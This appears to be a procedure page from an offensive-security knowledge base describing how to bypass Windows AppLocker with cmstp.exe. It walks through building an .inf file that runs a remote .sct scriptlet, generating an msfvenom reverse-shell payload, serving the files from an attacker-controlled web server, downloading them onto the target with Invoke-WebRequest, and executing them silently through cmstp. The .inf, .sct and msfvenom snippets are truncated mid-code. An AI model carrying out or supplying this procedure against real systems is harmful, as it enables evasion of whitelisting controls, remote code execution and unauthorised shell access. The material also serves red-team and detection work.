---
id: bf952c42-aab8-43d3-bb4c-adbbe42998f6
name: Windows AppLocker Whitelist Bypass (cmstp.exe)
type: procedure
verified: true
submitted: true
created_at: '2019-11-20T18:41:30.811422+00:00'
updated_at: '2023-05-25T19:43:27.774614+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[CMSTP|T1191 - CMSTP]]'
platforms:
- Windows
tags:
- '[[applocker]]'
- '[[Defense Bypass]]'
commands:
- '[[cmstp Run an INF file]]'
- '[[Invoke-WebRequest Download a File from a Web Server]]'
- '[[Launch a Python 3 Web Server]]'
---

# Windows AppLocker Whitelist Bypass (cmstp.exe)

**Status**: ✓ Verified

## Summary

Use cmstp.exe to execute an .inf file on a Windows system, which in runs a .sct file from a remote webserver, which then executes a final payload. This approach may bypass AppLocker default whitelisting rules, as cmstp.exe is a signed Microsoft program. 

## Description

# Description

Use cmstp.exe to execute an .inf file on a Windows system, which in runs a .sct file from a remote webserver, which then executes a final payload. This approach may bypass AppLocker default whitelisting rules, as cmstp.exe is a signed Microsoft program. 

# Instructions

Three files will be generated:

- pwn.inf: contains instructions on executing a remote sct file.

- pwn.sct: contains instructions on executing the final  payload. Hosted on the attacker's web server

- shell.exe: final payload to be executed, typically a reverse shell

## Identify a Writable Directory

AppLocker restrictions will often limit the directories in which programs can be  executed. This means attackers may have to look for writable directories exempted from this restriction, such as a writable directory under "C:\Windows". Use the [Generic AppLocker Bypasses](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md) guide from the Ultimate AppLocker Bypass List to identify candidates. This procedure will use "C:\Windows\Tasks"

## Create Payloads

1. Create 'pwn.inf', which will execute the .sct file on a remote server

**Code**: [[[version]
Signature=$chicago$
AdvancedINF=2.5

[De]]

2. Create 'pwn.sct', which will execute the final payload "shell.exe" on the local machine.

**Code**: [[<?XML version="1.0"?>
<scriptlet>
<registration 
 ]]

3. Create the final payload. Suggested:

**Code**: [[msfvenom -p windows/x64/shell_reverse_tcp LHOST=$_]]

4. Copy the .sct, .inf, and .exe files to a folder, and launch a Python 3 web server to host the files

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

5. On the target, download the .inf and .exe files. The .exe  should be placed in the writable directory, identified earlier (C:\Windows\Tasks).

**Command** ([[Invoke-WebRequest Download a File from a Web Server]]):

```bash
Invoke-WebRequest -Uri http://$_REMOTE_IP/$_FILENAME -Outfile $_FILENAME
```

## Execute CMSTP

Use cmstp.exe to run the .inf file, which will in turn run the .sct file which executes shell.exe

**Command** ([[cmstp Run an INF file]]):

```bash
cmstp.exe /ni /s C:\$_DEST_DIR\$_FILE_NAME.inf
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[CMSTP|T1191 - CMSTP]]

## Commands Used

- [[cmstp Run an INF file]]
- [[Invoke-WebRequest Download a File from a Web Server]]
- [[Launch a Python 3 Web Server]]

## Tags

- [[applocker]]
- [[Defense Bypass]]
